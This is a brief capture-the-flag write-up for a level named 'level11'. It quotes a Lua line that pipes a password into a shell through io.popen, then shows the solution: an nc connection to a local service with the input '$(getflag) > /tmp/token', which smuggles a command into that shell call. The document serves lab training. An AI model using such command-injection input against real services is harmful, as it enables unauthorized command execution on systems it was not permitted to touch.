## level11

Look at the line of `level11.lua`:
```lua
...
prog = io.popen("echo "..pass.." | sha1sum", "r")
...
```

You're overthinking! The solution is really simple:
```bash
nc localhost 5151
Password: $(getflag) > /tmp/token
```

And get your token! 
```bash
cat /tmp/token
```